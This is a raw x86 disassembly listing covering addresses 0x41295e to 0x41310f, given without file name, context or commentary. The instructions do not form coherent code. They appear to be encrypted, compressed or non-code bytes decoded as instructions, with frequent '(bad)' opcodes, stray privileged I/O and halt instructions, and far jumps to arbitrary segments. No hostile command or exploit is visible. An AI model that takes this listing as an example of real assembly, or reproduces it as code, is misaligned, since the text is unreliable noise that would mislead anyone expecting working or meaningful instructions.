  41295e:	sbb    ah,0x11
  412961:	sar    BYTE PTR [ebp+0x3b9cd054],cl
  412967:	es dec ebx
  412969:	loopne 0x4129b9
  41296b:	cmp    eax,DWORD PTR [edx]
  41296d:	push   ebx
  41296e:	adc    bh,BYTE PTR [ecx+0x3f]
  412971:	add    DWORD PTR [esp+edi*2+0x68dcf1e3],edi
  412978:	push   edi
  412979:	aam    0x1c
  41297b:	xlat   BYTE PTR ds:[ebx]
  41297c:	test   al,0xe1
  41297e:	sbb    ebx,DWORD PTR [ebx]
  412980:	xchg   edx,eax
  412981:	into   
  412982:	in     eax,0x1c
  412984:	and    eax,0x9d0ed24b
  412989:	gs add bl,0xa3
  41298d:	dec    edx
  41298e:	jne    0x412a05
  412990:	dec    BYTE PTR [edx]
  412992:	jmp    0x412929
  412994:	stos   BYTE PTR es:[edi],al
  412995:	jns    0x4129ea
  412997:	xchg   edx,eax
  412998:	aad    0xa9
  41299a:	aaa    
  41299b:	pop    ebx
  41299c:	cmp    eax,0x283d6145
  4129a1:	mov    esp,0x4ee00f94
  4129a6:	dec    ebp
  4129a7:	mov    ecx,DWORD PTR [edi-0x54]
  4129aa:	int    0xf6
  4129ac:	repnz pop eax
  4129ae:	inc    esp
  4129af:	cmp    al,0x4f
  4129b1:	sub    dl,BYTE PTR [ebp+0x4b]
  4129b4:	ror    al,1
  4129b6:	push   edx
  4129b7:	out    dx,eax
  4129b8:	xchg   DWORD PTR [ebx],ecx
  4129ba:	jle    0x4129d8
  4129bc:	cmp    BYTE PTR [edx],ch
  4129be:	xor    eax,0xebb86054
  4129c3:	lds    ebp,FWORD PTR [edi+0xd]
  4129c6:	fnstenv [eax]
  4129c8:	popf   
  4129c9:	outs   dx,BYTE PTR ds:[esi]
  4129ca:	jmp    FWORD PTR [edx]
  4129cc:	call   0xc4cd:0x4a4dc3b2
  4129d3:	mov    ecx,0x7d45a5bb
  4129d8:	lods   eax,DWORD PTR ds:[esi]
  4129d9:	dec    eax
  4129da:	mul    bh
  4129dc:	aaa    
  4129dd:	pop    DWORD PTR [edi]
  4129df:	xchg   esp,eax
  4129e0:	jno    0x412a19
  4129e2:	pop    ebx
  4129e3:	ret    
  4129e4:	mov    esp,0x5cb9ec50
  4129e9:	int3   
  4129ea:	enter  0xdc26,0x66
  4129ee:	ret    
  4129ef:	jg     0x412a09
  4129f1:	mov    ch,0x51
  4129f3:	and    eax,0xec4aa4a5
  4129f8:	adc    cl,dl
  4129fa:	nop
  4129fb:	cmp    ah,BYTE PTR [edi-0x647f96c0]
  412a01:	xchg   ecx,esi
  412a03:	pop    esp
  412a04:	xchg   edx,eax
  412a05:	stos   DWORD PTR es:[edi],eax
  412a06:	inc    edi
  412a07:	inc    ebp
  412a08:	sbb    al,0x8e
  412a0a:	push   ebp
  412a0b:	mov    eax,0xa76506f4
  412a10:	mov    eax,0x4a96cb1b
  412a15:	in     eax,dx
  412a16:	xchg   ecx,eax
  412a17:	repz test BYTE PTR [ebp+0x38],dh
  412a1b:	fidivr DWORD PTR [ebp+ecx*4-0x73]
  412a1f:	jp     0x4129f1
  412a21:	add    esi,DWORD PTR [edx+0x2fcdc50]
  412a27:	and    edx,edx
  412a29:	retf   0xb658
  412a2c:	out    0xd3,eax
  412a2e:	lahf   
  412a2f:	inc    esi
  412a30:	lahf   
  412a31:	or     bl,ah
  412a33:	xchg   BYTE PTR [eax],bl
  412a35:	scas   eax,DWORD PTR es:[edi]
  412a36:	cli    
  412a37:	inc    ebp
  412a38:	sbb    DWORD PTR [ebp*1+0x6d324d84],0xa0a024c3
  412a43:	jecxz  0x412a8e
  412a45:	test   eax,0x89a99c81
  412a4a:	pop    ecx
  412a4b:	rol    BYTE PTR [ebx+0x39d110c4],1
  412a51:	or     dl,BYTE PTR [ebp+eax*8+0x79041845]
  412a58:	mov    esp,0x1d6fa613
  412a5d:	jno    0x412a94
  412a5f:	mov    esp,DWORD PTR ds:0xa29f6fa6
  412a65:	clc    
  412a66:	lahf   
  412a67:	retf   
  412a68:	jmp    0x412a1e
  412a6a:	imul   edi,DWORD PTR [ebx-0x2f],0x9e36a9fd
  412a71:	(bad)  
  412a72:	fadd   QWORD PTR [esi+edx*1]
  412a75:	ss xchg ebp,eax
  412a77:	push   esi
  412a78:	or     eax,0x1ffe4a00
  412a7d:	hlt    
  412a7e:	lahf   
  412a7f:	(bad)  
  412a80:	xchg   edi,eax
  412a81:	jo     0x412adc
  412a83:	mov    cl,0xbe
  412a85:	test   bh,bh
  412a87:	dec    esi
  412a88:	popf   
  412a89:	shl    BYTE PTR [ebp-0xcf3a3e8],1
  412a8f:	scas   eax,DWORD PTR es:[edi]
  412a90:	xchg   ebx,eax
  412a91:	ret    
  412a92:	repnz pop edx
  412a94:	adc    al,0xe5
  412a96:	pop    eax
  412a97:	out    0x38,eax
  412a99:	leave  
  412a9a:	adc    eax,0xca648cbf
  412a9f:	xor    BYTE PTR [ecx],cl
  412aa1:	xor    DWORD PTR [ebx+0x50],ebx
  412aa4:	sbb    bl,BYTE PTR [edx]
  412aa6:	xchg   edi,eax
  412aa7:	std    
  412aa8:	addr16 push esp
  412aaa:	mov    ch,0x74
  412aac:	add    DWORD PTR [esi-0x64c5bd56],esi
  412ab2:	cmp    eax,0x974a158
  412ab7:	or     ecx,esi
  412ab9:	in     al,0x40
  412abb:	inc    ecx
  412abc:	(bad)
  412abf:	sbb    edi,DWORD PTR [esi]
  412ac1:	and    dh,BYTE PTR [ebx+edi*2+0x3dc0c65f]
  412ac8:	(bad)  
  412ac9:	ins    BYTE PTR es:[edi],dx
  412aca:	retf   0xdc49
  412acd:	mov    dh,0x83
  412acf:	and    BYTE PTR [ecx+0x5f7474da],ah
  412ad5:	lea    eax,[edi-0x2d]
  412ad8:	stos   DWORD PTR es:[edi],eax
  412ad9:	dec    edx
  412ada:	dec    edx
  412adb:	push   esi
  412adc:	or     al,0x65
  412ade:	fiadd  DWORD PTR [eax*1-0x4533833e]
  412ae5:	sti    
  412ae6:	and    ch,BYTE PTR [ecx]
  412ae8:	mov    eax,0x9e3cbda2
  412aed:	dec    edi
  412aee:	and    cl,BYTE PTR [ecx+0x9]
  412af1:	mov    al,0xcb
  412af3:	aad    0x6e
  412af5:	test   DWORD PTR [eax+ebp*1+0x3d0947f0],0xad8ea715
  412b00:	mov    dl,0x76
  412b02:	mov    ?,WORD PTR [edx]
  412b04:	or     BYTE PTR [ebp+0xd],0xf7
  412b08:	adc    ebp,DWORD PTR [ebx+0x4eb09396]
  412b0e:	imul   edx,DWORD PTR [ecx],0x44ece035
  412b14:	pop    ebp
  412b15:	xor    DWORD PTR [esi+esi*8],esp
  412b18:	pusha  
  412b19:	mov    dl,0x93
  412b1b:	xchg   ebx,eax
  412b1c:	test   al,0x37
  412b1e:	cmp    eax,0x7becd252
  412b23:	ss sbb eax,0x32d55418
  412b29:	adc    al,0xbf
  412b2b:	inc    esp
  412b2c:	sub    al,0x92
  412b2e:	call   0x4cc:0x822234ba
  412b35:	cmp    eax,esp
  412b37:	push   ebp
  412b38:	std    
  412b39:	shl    DWORD PTR [edi+edi*8],cl
  412b3c:	ins    DWORD PTR es:[edi],dx
  412b3d:	or     al,0xb5
  412b3f:	dec    edx
  412b40:	test   DWORD PTR [ebx],ebx
  412b42:	xor    eax,0x956308b7
  412b47:	sbb    DWORD PTR [ecx+0x20],edx
  412b4a:	dec    ebp
  412b4b:	push   0x3f9de8c9
  412b50:	imul   BYTE PTR [ebp-0x5f6b1963]
  412b56:	cmp    dh,BYTE PTR [eax-0x42]
  412b59:	mov    dh,0xd1
  412b5b:	fbstp  TBYTE PTR [eax+0x16]
  412b5e:	push   0x529ed7a4
  412b63:	push   edi
  412b64:	ins    BYTE PTR es:[edi],dx
  412b65:	push   0xe0532a6d
  412b6a:	aas    
  412b6b:	xlat   BYTE PTR ds:[ebx]
  412b6c:	shl    bl,0x34
  412b6f:	fimul  WORD PTR [ecx]
  412b71:	fstp   st(3)
  412b73:	sub    BYTE PTR [esi+0x3d7e2ef4],bl
  412b79:	shl    DWORD PTR [ecx],cl
  412b7b:	push   ebp
  412b7c:	push   ds
  412b7d:	cmp    ecx,DWORD PTR [ebp-0x2c]
  412b80:	xor    ecx,ebp
  412b82:	pop    eax
  412b83:	or     eax,0x9004d929
  412b88:	dec    eax
  412b8a:	rcl    dl,0x15
  412b8d:	cli    
  412b8e:	shl    BYTE PTR [edx],0x99
  412b91:	popf   
  412b92:	xchg   ebp,eax
  412b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b94:	int3   
  412b95:	mov    ah,0xab
  412b97:	adc    al,0xc3
  412b99:	sbb    BYTE PTR [ecx-0x29],al
  412b9c:	stos   DWORD PTR es:[edi],eax
  412b9d:	retf   0xda5d
  412ba0:	sti    
  412ba1:	jae    0x412b72
  412ba3:	add    eax,DWORD PTR [eax+0x18]
  412ba6:	outs   dx,DWORD PTR ds:[esi]
  412ba7:	bnd jg 0x412b8b
  412baa:	ins    BYTE PTR es:[edi],dx
  412bab:	xor    dh,BYTE PTR [ebp-0x7d]
  412bae:	inc    ebx
  412baf:	jo     0x412b56
  412bb1:	arpl   WORD PTR [edi-0x45a5c7ce],ax
  412bb7:	xchg   esi,eax
  412bb8:	bnd jnp 0x412b55
  412bbb:	test   al,0x1e
  412bbd:	fsincos 
  412bbf:	ror    BYTE PTR [edi+0x2d5da1c],0x70
  412bc6:	je     0x412be5
  412bc8:	out    dx,eax
  412bc9:	dec    eax
  412bca:	fwait
  412bcb:	inc    BYTE PTR [esi-0x6dd31927]
  412bd1:	add    eax,0x835d5ac2
  412bd6:	fnstcw WORD PTR [ecx]
  412bd8:	and    al,0x73
  412bda:	xor    DWORD PTR [ebx+0x14],esp
  412bdd:	or     al,0xf9
  412bdf:	dec    ebp
  412be0:	push   es
  412be1:	and    al,0xf8
  412be3:	je     0x412c41
  412be5:	test   DWORD PTR [ebx-0x4e],eax
  412be8:	ret    
  412be9:	loop   0x412bf8
  412beb:	mov    WORD PTR [edx],gs
  412bed:	(bad)  
  412bee:	loopne 0x412b8c
  412bf0:	icebp  
  412bf1:	adc    eax,DWORD PTR [edx+0x71894672]
  412bf7:	xchg   ecx,eax
  412bf8:	aam    0x80
  412bfa:	test   BYTE PTR [ecx],0x6a
  412bfd:	daa    
  412bfe:	pop    ebp
  412bff:	dec    ebx
  412c00:	fwait
  412c01:	std    
  412c02:	fiadd  WORD PTR [edx-0x7d]
  412c05:	sbb    edi,DWORD PTR [edx+0x12]
  412c08:	jp     0x412c53
  412c0a:	mov    al,0x81
  412c0c:	ret    
  412c0d:	or     bl,bl
  412c0f:	cmp    eax,0x8da8ab6c
  412c14:	jge    0x412c43
  412c16:	sub    eax,0xf9ba22b8
  412c1b:	dec    edi
  412c1c:	or     DWORD PTR [edi+0x1f54e198],edi
  412c22:	pop    es
  412c23:	mov    WORD PTR [eax+0x77],es
  412c26:	bound  edx,QWORD PTR [esi-0x42]
  412c29:	dec    ebx
  412c2a:	inc    ecx
  412c2b:	push   0x76dc8402
  412c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c31:	push   esi
  412c32:	xchg   DWORD PTR [edi+edx*8-0x653e09dd],ebx
  412c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c3a:	stos   DWORD PTR es:[edi],eax
  412c3b:	inc    edi
  412c3c:	jno    0x412c19
  412c3e:	mov    dh,0xeb
  412c40:	add    al,0x98
  412c42:	mov    dl,0x73
  412c44:	or     esp,edx
  412c46:	mov    al,ds:0xa45fad8e
  412c4b:	lods   eax,DWORD PTR ds:[esi]
  412c4c:	ror    DWORD PTR [edx],0xc0
  412c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c50:	jns    0x412cba
  412c52:	xor    eax,0xd1901d40
  412c57:	mov    bl,BYTE PTR [edx-0x303740]
  412c5d:	mov    ch,0x83
  412c5f:	cmp    DWORD PTR [edx+0x50],edi
  412c62:	iret   
  412c63:	es jecxz 0x412c7e
  412c66:	ins    DWORD PTR es:[edi],dx
  412c67:	sub    DWORD PTR [ecx],0x45384803
  412c6d:	xor    al,0x80
  412c6f:	fsub   QWORD PTR [eax-0x24]
  412c72:	sub    eax,0xd05f95c
  412c77:	hlt    
  412c78:	or     DWORD PTR [ebp-0x66a21435],ecx
  412c7e:	or     dh,BYTE PTR [edi]
  412c80:	push   ecx
  412c81:	ss jecxz 0x412c94
  412c84:	fs ja  0x412cfb
  412c87:	(bad)
  412c8b:	mov    ah,bl
  412c8d:	iret   
  412c8e:	(bad)  
  412c90:	add    edi,DWORD PTR [edi+0x2d]
  412c93:	and    eax,0x6c314f5c
  412c98:	ret    0xb73
  412c9b:	cmp    ebx,DWORD PTR ss:[esi-0x4]
  412c9f:	jecxz  0x412cfd
  412ca1:	pop    edi
  412ca2:	push   ebp
  412ca3:	imul   edx,edx,0xd
  412ca6:	mov    edi,0xb3089618
  412cab:	mov    ah,0x22
  412cad:	push   es
  412cae:	stc    
  412caf:	je     0x412d10
  412cb1:	push   eax
  412cb2:	cmp    al,0xda
  412cb4:	xor    eax,0x8c75d131
  412cb9:	sub    BYTE PTR [ecx+0x58f8b26f],al
  412cbf:	lahf   
  412cc0:	inc    edx
  412cc1:	or     BYTE PTR [edx+0x3371829c],al
  412cc7:	dec    esp
  412cc8:	icebp  
  412cc9:	add    al,bh
  412ccb:	les    sp,DWORD PTR [eax]
  412cce:	and    edx,DWORD PTR [ebp-0x2b]
  412cd1:	mov    esp,0x5bf4b105
  412cd6:	arpl   WORD PTR [edx],cx
  412cd8:	sub    al,0xed
  412cda:	jl     0x412d3c
  412cdc:	or     ebp,ecx
  412cde:	(bad)  
  412cdf:	cs inc ebp
  412ce1:	jmp    0x8aff:0x1eeaec50
  412ce8:	jmp    0xe98f:0xa85b5997
  412cef:	out    dx,al
  412cf0:	in     al,0xf4
  412cf2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  412cf4:	adc    ecx,DWORD PTR [esi]
  412cf6:	int    0xe1
  412cf8:	add    esi,DWORD PTR [eax-0x46]
  412cfb:	xchg   ebp,eax
  412cfc:	or     dh,cl
  412cfe:	ss repnz inc esp
  412d01:	mov    cs,WORD PTR [edi]
  412d03:	xor    ebp,eax
  412d05:	lar    ebp,WORD PTR [esi-0x37]
  412d09:	adc    eax,0x6b756540
  412d0e:	sub    al,0x7a
  412d10:	in     eax,dx
  412d11:	jns    0x412cad
  412d13:	pop    ds
  412d14:	mov    ebx,0xec19c810
  412d19:	ret    0xf8fd
  412d1c:	inc    esi
  412d1d:	jmp    0x412ca4
  412d1f:	mov    ah,0x5b
  412d21:	cs scas eax,DWORD PTR es:[edi]
  412d23:	les    ebp,FWORD PTR [edx]
  412d25:	sbb    esp,DWORD PTR [ebp-0x67f12c7c]
  412d2b:	test   eax,0x1ce1ec49
  412d30:	cmc    
  412d31:	or     bh,BYTE PTR [eax-0x27]
  412d34:	xchg   edi,eax
  412d35:	div    DWORD PTR [ecx+esi*1]
  412d38:	adc    DWORD PTR [edi+0x3c0b20a7],edx
  412d3e:	xor    al,0x23
  412d40:	fcom   DWORD PTR [ebx]
  412d42:	sub    ah,ah
  412d44:	int3   
  412d45:	popa   
  412d46:	fdiv   DWORD PTR [ebx+0x2c]
  412d49:	fmul   QWORD PTR [esi+0x4f9a0fb]
  412d4f:	loopne 0x412cfa
  412d51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d52:	fwait
  412d53:	cmp    edx,DWORD PTR [ecx]
  412d55:	push   edx
  412d56:	je     0x412d40
  412d58:	cmp    BYTE PTR [eax+0x31af24f3],ah
  412d5e:	ds aas 
  412d60:	pusha  
  412d61:	pop    ss
  412d62:	in     eax,dx
  412d63:	pop    edx
  412d64:	add    al,0x5
  412d66:	adc    esp,DWORD PTR [edi+edx*8-0x15]
  412d6a:	inc    eax
  412d6b:	test   DWORD PTR [ebp+0x5],esi
  412d6e:	or     al,0x39
  412d70:	xchg   bl,al
  412d72:	push   eax
  412d73:	adc    edx,ebx
  412d75:	adc    BYTE PTR [edx-0x19],dl
  412d78:	(bad)  
  412d7a:	add    bh,al
  412d7c:	lea    edx,[ebx+0x5b238f6a]
  412d82:	adc    esi,esp
  412d84:	(bad)  
  412d86:	or     BYTE PTR [ecx+0x7],dh
  412d89:	sbb    eax,0xc85a515
  412d8e:	jl     0x412d5c
  412d90:	in     al,0xc9
  412d92:	mov    edx,0x628be94b
  412d97:	bound  eax,QWORD PTR [edi+0x14]
  412d9a:	ins    DWORD PTR es:[edi],dx
  412d9b:	stos   DWORD PTR es:[edi],eax
  412d9c:	xchg   ebp,edx
  412d9e:	inc    ebp
  412d9f:	test   esp,eax
  412da1:	jnp    0x412dc0
  412da3:	jmp    0xcefc1877
  412da8:	mov    ecx,0xa010efb3
  412dad:	popf   
  412dae:	sub    bh,BYTE PTR [ecx+0x51de661b]
  412db4:	sub    BYTE PTR [eax+edx*4],dh
  412db7:	repz and al,0x8f
  412dba:	xchg   ecx,eax
  412dbb:	ret    
  412dbc:	pop    ss
  412dbd:	sbb    bh,BYTE PTR [eax+0x17]
  412dc0:	ror    DWORD PTR [ebx+0x1bc2d1d6],0x5f
  412dc7:	jg     0x412d67
  412dc9:	xor    eax,0x3b845785
  412dce:	pop    edx
  412dcf:	out    dx,eax
  412dd0:	mov    gs,WORD PTR [ebp-0x75]
  412dd3:	sbb    edx,DWORD PTR [edi]
  412dd5:	sbb    al,0xba
  412dd7:	aad    0x7
  412dd9:	test   eax,0x9c82b715
  412dde:	push   edx
  412ddf:	ss cmp ah,al
  412de2:	je     0x412dfe
  412de4:	sahf   
  412de5:	push   ss
  412de6:	sub    eax,0x5d1477be
  412deb:	mov    bh,0xb0
  412ded:	jge    0x412d9f
  412def:	lahf   
  412df0:	mov    eax,ds:0x4cdde5d8
  412df5:	xor    ah,BYTE PTR [esi-0xabc3ccc]
  412dfb:	xchg   esp,eax
  412dfc:	push   edx
  412dfd:	outs   dx,DWORD PTR ds:[esi]
  412dfe:	les    edx,FWORD PTR ds:0xc482cce3
  412e04:	out    0xb9,al
  412e06:	arpl   bx,di
  412e08:	push   es
  412e09:	hlt    
  412e0a:	or     esp,esi
  412e0c:	and    eax,0x377ca7ae
  412e11:	imul   eax,DWORD PTR [ecx-0x10767314],0xffffffd8
  412e18:	mov    dh,0xbb
  412e1a:	mov    WORD PTR [edx],ds
  412e1c:	std    
  412e1d:	adc    eax,0x2cb8b0dc
  412e22:	jl     0x412e99
  412e24:	lods   al,BYTE PTR ds:[esi]
  412e25:	sub    DWORD PTR [eax],eax
  412e27:	loope  0x412df7
  412e29:	pop    eax
  412e2a:	cmp    DWORD PTR [esp+ecx*8+0x41524df0],0x39
  412e32:	adc    ebx,esi
  412e34:	and    eax,0xeedc2bdc
  412e39:	lods   al,BYTE PTR ds:[esi]
  412e3a:	jo     0x412e25
  412e3c:	jg     0x412e44
  412e3e:	cdq    
  412e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e40:	call   0xe8b1:0x4f6c81be
  412e47:	popa   
  412e48:	icebp  
  412e49:	jge    0x412e1c
  412e4b:	or     eax,0x12b893fc
  412e50:	pop    ds
  412e51:	adc    DWORD PTR [ecx],edx
  412e53:	mov    esp,0x320a123c
  412e58:	adc    BYTE PTR [esi+0x6abf61fb],bl
  412e5e:	lahf   
  412e5f:	and    DWORD PTR [ebp-0x6f],0xf
  412e63:	sub    edi,DWORD PTR [edi+0x6a928b9c]
  412e69:	pop    esp
  412e6a:	add    eax,0x6fdbd188
  412e6f:	ret    0xf270
  412e72:	jle    0x412e8c
  412e74:	sahf   
  412e75:	(bad)  
  412e76:	popf   
  412e77:	sbb    bh,al
  412e79:	jg     0x412eef
  412e7b:	and    eax,DWORD PTR [esi+edi*1]
  412e7e:	cmp    eax,0x83f2d0a4
  412e83:	arpl   WORD PTR [ecx-0x4dd11bca],cx
  412e89:	(bad)  [edx+0x6a41b2a3]
  412e8f:	les    ebp,FWORD PTR [eax-0x7a]
  412e92:	add    dh,BYTE PTR [edi]
  412e94:	hlt    
  412e95:	mov    ds:0xb3552e69,eax
  412e9a:	popa   
  412e9b:	mov    ebp,0x7275d3dc
  412ea0:	xor    ecx,0xffffffcb
  412ea3:	mov    eax,DWORD PTR [ecx]
  412ea5:	and    eax,0x6e34b8ee
  412eaa:	xchg   esp,eax
  412eab:	inc    ebx
  412eac:	loopne 0x412f05
  412eae:	mov    eax,0xf2262b8b
  412eb3:	xchg   esp,eax
  412eb4:	pop    esp
  412eb5:	xor    al,0x85
  412eb7:	pop    es
  412eb8:	mov    ebx,0xa06b5125
  412ebd:	push   ebp
  412ebe:	dec    ebx
  412ebf:	mov    ds:0x6df5c3b2,al
  412ec4:	add    bh,bl
  412ec6:	outs   dx,BYTE PTR ds:[esi]
  412ec7:	push   0xa
  412ec9:	fisttp WORD PTR [eax-0x691992d5]
  412ecf:	std    
  412ed0:	adc    eax,0x548d62e3
  412ed5:	mov    edx,0x9022115c
  412eda:	or     eax,0xf8e875e9
  412edf:	fistp  WORD PTR [esi-0x78]
  412ee2:	arpl   WORD PTR [ecx+ebp*4],di
  412ee5:	add    eax,0xe0e3c516
  412eea:	mov    WORD PTR [edx],ss
  412eec:	add    bh,ah
  412eee:	add    DWORD PTR [ecx-0x7f1b0ab3],edx
  412ef4:	inc    ebx
  412ef5:	mov    al,0x98
  412ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ef8:	arpl   WORD PTR ss:[edi+0x4],si
  412efc:	xor    edx,DWORD PTR [ecx]
  412efe:	xchg   ecx,eax
  412eff:	mov    ds:0xe3418a66,eax
  412f04:	out    0xc6,al
  412f06:	test   al,0x12
  412f08:	fcomp  QWORD PTR [eax-0x5efc3f37]
  412f0e:	fwait
  412f0f:	int    0x7e
  412f11:	neg    DWORD PTR ds:0x4cfb4038
  412f17:	add    dh,al
  412f19:	pop    esp
  412f1a:	sub    dl,BYTE PTR [edx]
  412f1c:	enter  0xdf69,0xa6
  412f20:	sbb    dl,BYTE PTR [esi+0x40d0903c]
  412f26:	or     eax,0x19d1c16c
  412f2b:	std    
  412f2c:	xchg   esi,eax
  412f2d:	jae    0x412efc
  412f2f:	hlt    
  412f30:	dec    ebp
  412f31:	mov    edi,0x9ee61932
  412f36:	pop    ds
  412f37:	and    DWORD PTR [edx+ecx*2],edx
  412f3a:	xor    BYTE PTR [edi-0x25be6239],bh
  412f40:	lahf   
  412f41:	lahf   
  412f42:	cmp    dh,dh
  412f44:	pop    esp
  412f45:	std    
  412f46:	dec    ebp
  412f47:	mov    eax,DWORD PTR [edi]
  412f49:	push   es
  412f4a:	mov    edi,0xa8ffb625
  412f4f:	xchg   esi,eax
  412f50:	in     eax,0x5f
  412f52:	mov    WORD PTR [edx+0x1d],ss
  412f55:	cmp    edx,DWORD PTR [edx-0x26b725b8]
  412f5b:	xchg   cl,dl
  412f5d:	sub    esi,esi
  412f5f:	push   edx
  412f60:	jg     0x412fd4
  412f62:	in     al,0x50
  412f64:	dec    esp
  412f65:	dec    eax
  412f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f67:	jne    0x412fda
  412f69:	imul   DWORD PTR [edx-0x7ffa9a16]
  412f6f:	push   esi
  412f70:	sbb    esp,DWORD PTR [ebx]
  412f72:	sbb    BYTE PTR [ecx],dh
  412f74:	and    ebp,esp
  412f76:	inc    ecx
  412f77:	ror    DWORD PTR [ebx],1
  412f79:	mov    esi,0xfdd4b0f1
  412f7e:	and    al,0x38
  412f80:	cmp    eax,0xb7523e3d
  412f85:	(bad)  
  412f86:	addr16 dec ecx
  412f88:	fst    QWORD PTR [eax-0x642534f7]
  412f8e:	rol    esi,0x7
  412f91:	cmp    DWORD PTR ds:0xe006159e,0x7115f962
  412f9b:	std    
  412f9c:	sub    eax,0xc6236dc3
  412fa1:	or     eax,0x26367afc
  412fa6:	(bad)  
  412fa7:	fldenv [edi+0x42]
  412faa:	fwait
  412fab:	mov    ecx,0x22a9133
  412fb0:	jnp    0x412f3f
  412fb2:	je     0x412fe1
  412fb4:	lods   eax,DWORD PTR ds:[esi]
  412fb5:	ret    0xd32c
  412fb8:	jg     0x412f54
  412fba:	dec    ecx
  412fbb:	and    dl,BYTE PTR [ebx]
  412fbd:	mov    ?,WORD PTR [eax+0x2f3677e9]
  412fc3:	je     0x412f5e
  412fc5:	jecxz  0x413044
  412fc7:	jbe    0x412f9c
  412fc9:	add    ecx,edi
  412fcb:	push   0xffffff9a
  412fcd:	sub    ecx,esp
  412fcf:	lock mov es,eax
  412fd2:	mov    bh,0x71
  412fd4:	popa   
  412fd5:	lahf   
  412fd6:	enter  0x50aa,0xdf
  412fda:	int3   
  412fdb:	xor    eax,ecx
  412fdd:	je     0x41300b
  412fdf:	jle    0x412f71
  412fe1:	aad    0x9b
  412fe3:	arpl   WORD PTR [ecx],cx
  412fe5:	clc    
  412fe6:	pop    ebp
  412fe7:	ret    0x4e5c
  412fea:	sbb    eax,0x48b26ae9
  412fef:	xchg   ecx,eax
  412ff0:	loop   0x412fea
  412ff2:	pushf  
  412ff3:	mov    edx,edx
  412ff5:	ins    BYTE PTR es:[edi],dx
  412ff6:	not    BYTE PTR [eax-0x152d12b8]
  412ffc:	cli    
  412ffd:	addr16 (bad) 
  412fff:	sahf   
  413000:	ins    BYTE PTR es:[edi],dx
  413001:	push   eax
  413002:	push   esi
  413003:	fs addr16 pop ss
  413006:	neg    BYTE PTR ds:0xaa5d4b0b
  41300c:	push   esi
  41300d:	sub    eax,0xbd2f68f5
  413012:	cld    
  413013:	retf   0xd0e3
  413016:	dec    ecx
  413017:	out    dx,eax
  413018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413019:	cmp    al,0xf5
  41301b:	int    0xeb
  41301d:	pop    edx
  41301e:	or     edx,ebx
  413020:	fstp   st(4)
  413022:	xchg   edi,eax
  413023:	ret    0x4962
  413026:	aaa    
  413027:	push   esi
  413028:	iret   
  413029:	sub    al,0x82
  41302b:	(bad)  
  41302c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41302d:	in     al,dx
  41302e:	repnz or BYTE PTR [edi],0x4f
  413032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413033:	and    esi,0xffffffd7
  413036:	add    BYTE PTR [esi],bl
  413038:	outs   dx,DWORD PTR ds:[esi]
  413039:	sti    
  41303a:	and    esp,DWORD PTR [ebx-0x4c]
  41303d:	arpl   ax,cx
  41303f:	adc    DWORD PTR [edx+ecx*1],eax
  413042:	shl    DWORD PTR [ebp+0x7c],cl
  413045:	jmp    0x2e98:0xee11a970
  41304c:	js     0x41301e
  41304e:	adc    al,0x13
  413050:	mov    ds:0x3acb6f13,eax
  413055:	iret   
  413056:	lods   eax,DWORD PTR ds:[esi]
  413057:	ret    
  413058:	repnz pop edi
  41305a:	out    dx,al
  41305b:	sar    BYTE PTR [eax-0x3],1
  41305e:	(bad)  
  41305f:	rol    DWORD PTR [esi+0x0],1
  413062:	xchg   edi,eax
  413063:	push   esp
  413064:	retf   0xad28
  413067:	cli    
  413068:	sub    ch,BYTE PTR ds:0x8c407253
  41306e:	arpl   bx,cx
  413070:	xchg   ecx,eax
  413071:	cmovp  eax,DWORD PTR [eax+0x1028b1c7]
  413078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413079:	inc    ecx
  41307a:	test   al,0x5e
  41307c:	iret   
  41307d:	push   ebp
  41307e:	cmp    esp,DWORD PTR [eax+0x1]
  413081:	ins    DWORD PTR es:[edi],dx
  413082:	mov    esp,0xf430c716
  413087:	mov    cl,0x7c
  413089:	shl    DWORD PTR [ebx+0x66cb2ee8],cl
  41308f:	cmp    al,BYTE PTR [ecx]
  413091:	or     eax,0x3ca03025
  413096:	mov    DWORD PTR ds:0xdbc4fa67,esp
  41309c:	call   0x8250:0x38a69148
  4130a3:	inc    ecx
  4130a4:	jle    0x4130fb
  4130a6:	imul   ecx,DWORD PTR [ebx+0x23],0xffffff92
  4130aa:	inc    DWORD PTR [edi+0x5d]
  4130ad:	sub    al,0xf7
  4130af:	dec    esi
  4130b0:	mov    dl,0xeb
  4130b2:	mov    bh,0x2c
  4130b4:	xchg   DWORD PTR [edx-0x55],ecx
  4130b7:	arpl   dx,bp
  4130b9:	call   0xc55a:0xa2e6b1ce
  4130c0:	scas   eax,DWORD PTR es:[edi]
  4130c1:	and    eax,0xdba2e640
  4130c6:	cwde   
  4130c7:	fsubp  st(5),st
  4130c9:	scas   al,BYTE PTR es:[edi]
  4130ca:	bound  edi,QWORD PTR [edi+0x28]
  4130cd:	xchg   edx,eax
  4130ce:	dec    edx
  4130cf:	scas   eax,DWORD PTR es:[edi]
  4130d0:	pop    eax
  4130d1:	(bad)  
  4130d2:	lea    ebx,[ecx+0xd]
  4130d5:	sahf   
  4130d6:	mov    al,0xd2
  4130d8:	xor    al,0x14
  4130da:	lahf   
  4130db:	mov    ds:0x6be4446e,eax
  4130e0:	inc    BYTE PTR [esi+0x342b8dac]
  4130e6:	inc    ebx
  4130e7:	iret   
  4130e8:	xor    ch,BYTE PTR ds:0xeb520f8a
  4130ee:	pop    esp
  4130ef:	xchg   ebp,eax
  4130f0:	xor    ecx,ebx
  4130f2:	pusha  
  4130f3:	ror    dl,1
  4130f5:	sub    BYTE PTR [eax+0x426df710],0xb7
  4130fc:	push   ds
  4130fd:	push   eax
  4130fe:	mov    ds:0xae90f512,eax
  413103:	cld    
  413104:	pusha  
  413105:	ret    
  413106:	mov    ah,0x0
  413108:	je     0x413173
  41310a:	or     eax,0xe4d9cb1c
  41310f:	mov    es:0xb567dd1e,eax
